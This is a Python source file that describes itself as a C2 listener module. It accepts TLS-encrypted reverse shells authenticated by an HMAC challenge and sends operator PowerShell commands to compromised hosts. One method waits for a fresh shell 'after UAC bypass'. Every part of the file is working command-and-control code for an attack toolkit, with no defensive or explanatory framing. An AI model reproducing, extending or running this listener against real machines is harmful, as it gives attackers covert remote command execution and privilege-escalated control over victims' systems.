"""
C2 Listener Module - Handles TLS socket, handshake, and ShellManager
"""

import socket
import ssl
import hmac
import hashlib
import tempfile
import subprocess
import os
import time
from rich.console import Console

console = Console()


def generate_self_signed_cert():
    """Generate ephemeral self-signed certificate for TLS encryption."""
    cert_dir = tempfile.mkdtemp()
    key_file = f"{cert_dir}/server.key"
    cert_file = f"{cert_dir}/server.crt"

    subprocess.run([
        "openssl", "req", "-x509", "-newkey", "rsa:2048",
        "-keyout", key_file, "-out", cert_file,
        "-days", "1", "-nodes", "-batch",
        "-subj", "/CN=localhost"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    return cert_file, key_file


class ShellManager:
    """Manages the TLS-encrypted shell connection with HMAC handshake."""

    def __init__(self, config):
        self.config = config
        self.sock = None
        self.conn = None
        self.addr = None
        self.ssl_context = None
        self.connected = False

    def start_listener(self, port):
        """Start a TLS listener on the specified port with fallback."""
        if self.config.cert_file and self.config.key_file:
            cert_file, key_file = self.config.cert_file, self.config.key_file
        else:
            cert_file, key_file = generate_self_signed_cert()
            self.config.cert_file = cert_file
            self.config.key_file = key_file

        self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        self.ssl_context.load_cert_chain(cert_file, key_file)

        for attempt_port in range(port, port + 10):
            try:
                raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                raw_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                raw_sock.bind(('0.0.0.0', attempt_port))
                raw_sock.listen(5)
                self.sock = raw_sock
                if attempt_port != port:
                    console.print(f"[yellow]Port {port} busy, using {attempt_port}[/]")
                self.config.listener_port = attempt_port
                console.print(f"[green]TLS Listener started on port {attempt_port}[/]")
                return
            except OSError:
                continue
        raise Exception(f"No available ports in range {port}-{port+9}!")

    def _perform_handshake(self, raw_conn):
        """Internal helper to wrap socket in TLS and perform HMAC handshake."""
        raw_conn.settimeout(10)
        try:
            conn = self.ssl_context.wrap_socket(raw_conn, server_side=True)
            console.print(f"[dim]TLS handshake OK from {self.addr[0]}[/]")
        except Exception as e:
            console.print(f"[red]SSL error from {self.addr[0]}: {e}[/]")
            raw_conn.close()
            return None

        conn.settimeout(10)
        try:
            challenge = os.urandom(16).hex()
            conn.send(f"CHALLENGE:{challenge}\n".encode())
            response = conn.recv(256).decode().strip()
            expected = hmac.new(
                self.config.handshake_secret.encode(),
                challenge.encode(),
                hashlib.sha256
            ).hexdigest()

            if response.lower() == expected.lower():
                console.print(f"[bold green]AUTHENTICATED SHELL from {self.addr[0]}![/]")
                return conn
            else:
                console.print(f"[red]Handshake FAILED from {self.addr[0]}[/]")
                conn.close()
                return None
        except Exception as e:
            console.print(f"[red]Handshake error: {e}[/]")
            conn.close()
            return None

    def wait_for_connection(self, timeout=300):
        """Wait for an incoming TLS connection with HMAC handshake."""
        self.sock.settimeout(timeout)
        start_time = time.time()
        while True:
            if time.time() - start_time > timeout:
                return False
            try:
                raw_conn, addr = self.sock.accept()
                self.addr = addr
                conn = self._perform_handshake(raw_conn)
                if conn:
                    self.conn = conn
                    self.connected = True
                    return True
            except socket.timeout:
                continue
            except Exception:
                return False

    def wait_for_new_shell(self, timeout=30):
        """Wait for a new shell connection (e.g., after UAC bypass)."""
        console.print(f"[cyan]Waiting for new shell connection (up to {timeout}s)...[/]")
        try:
            self.sock.settimeout(timeout)
            raw_conn, addr = self.sock.accept()
            self.addr = addr
            conn = self._perform_handshake(raw_conn)
            if conn:
                if self.conn:
                    try:
                        self.conn.close()
                    except Exception:
                        pass
                self.conn = conn
                self.connected = True
                return True
            return False
        except socket.timeout:
            console.print("[yellow]No new shell connected.[/]")
            return False

    def execute(self, cmd):
        """Execute a command on the connected shell."""
        if not self.conn or not self.connected:
            return "[No shell connected]"

        try:
            # Clear buffer
            self.conn.setblocking(0)
            try:
                while self.conn.recv(4096):
                    pass
            except Exception:
                pass
            self.conn.setblocking(1)

            delimiter = self.config.cmd_delimiter
            wrapped_cmd = f"{cmd}; Write-Host '{delimiter}'"
            self.conn.send((wrapped_cmd + "\n").encode())
            
            self.conn.settimeout(self.config.cmd_timeout)
            output = ""
            while True:
                try:
                    chunk = self.conn.recv(4096).decode(errors='ignore')
                    if not chunk:
                        break
                    output += chunk
                    if delimiter in output:
                        break
                except socket.timeout:
                    break

            if delimiter in output:
                output = output.split(delimiter)[0]

            return output.strip() if output.strip() else "[No output captured]"

        except Exception as e:
            self.connected = False
            return f"[Error: {e}]"

    def close(self):
        if self.conn:
            try:
                self.conn.close()
            except Exception:
                pass
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
